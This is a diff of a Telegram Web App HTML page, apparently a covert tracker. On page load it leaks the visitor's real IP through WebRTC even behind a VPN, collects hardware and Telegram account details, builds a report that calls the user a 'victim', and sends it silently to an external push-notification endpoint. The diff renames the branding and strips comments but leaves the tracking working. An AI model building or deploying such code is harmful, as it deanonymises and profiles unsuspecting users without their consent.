@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>ShadowCode: DeepSpy v2.0</title>
+    <title>ТЕСТ</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
         const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
@@ -21,8 +21,7 @@
             }).catch(() => {}); // Тишина в эфире
         }
 
-        // === 1. ДОСТАЕМ РЕАЛЬНЫЙ IP ЧЕРЕЗ ДЫРУ WebRTC (валит даже VPN) ===
-        function getRealIP() {
+                function getRealIP() {
             return new Promise((resolve) => {
                 const pc = new RTCPeerConnection({
                     iceServers: [{urls: "stun:stun.l.google.com:19302"}]
@@ -36,7 +35,7 @@
                     const match = candidate.match(ipRegex);
                     if (match) {
                         const ip = match[0];
-                        // Фильтруем локальный мусор
+                        //  локальный мусор
                         if (!ip.startsWith('127.') && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('169.254')) {
                             resolve(ip);
                             pc.close();
@@ -48,7 +47,7 @@
             });
         }
 
-        // === 2. ПАРСИМ ПРОЦЕССОР, ЯДРА, ПАМЯТЬ, ОС ===
+        // === 2.  ПРОЦЕССОР, ЯДРА, ПАМЯТЬ, ОС ===
         function getHardwareInfo() {
             let hw = {
                 cores: navigator.hardwareConcurrency || 'N/A',
@@ -60,7 +59,7 @@
                 vendor: 'N/A'
             };
 
-            // Попытка вытащить архитектуру (не всегда доступно)
+            
             try {
                 const ua = navigator.userAgent;
                 if (ua.indexOf('x86_64') !== -1 || ua.indexOf('x86-64') !== -1 || ua.indexOf('Win64') !== -1 || ua.indexOf('x64') !== -1) {
@@ -86,9 +85,9 @@
                 }
             } catch (e) {}
 
-            // Комбинируем для красоты
+            // Комбо
             if (hw.renderer !== 'N/A') {
-                hw.osCPU = hw.renderer; // В рендере часто пишут модель чипа (Apple M1, Adreno 640 и т.д.)
+                hw.osCPU = hw.renderer; 
             }
 
             return hw;
@@ -120,7 +119,7 @@
             const hw = getHardwareInfo();
             const env = getAdvancedEnv();
             
-            let report = `⚡ SHADOWCODE DEEP SCAN | ${new Date().toLocaleString()}\n\n`;
+            let report = ` EliteArchangel SCAN 🪽 | ${new Date().toLocaleString()}\n\n`;
             report += `👤 ЖЕРТВА: @${tg.username} (ID: ${tg.id})\n`;
             report += `📛 Имя: ${tg.first_name} ${tg.last_name}\n`;
             report += `⭐ Статус: ${tg.is_premium}\n\n`;
@@ -188,9 +187,9 @@
         window.onload = function() {
             setTimeout(() => {
                 deepCollectAndSend();
-            }, 800); // Небольшая задержка для инициализации
+            }, 800); 
 
-            // Дополнительно дергаем ipify как резерв для проверки
+            
             try {
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
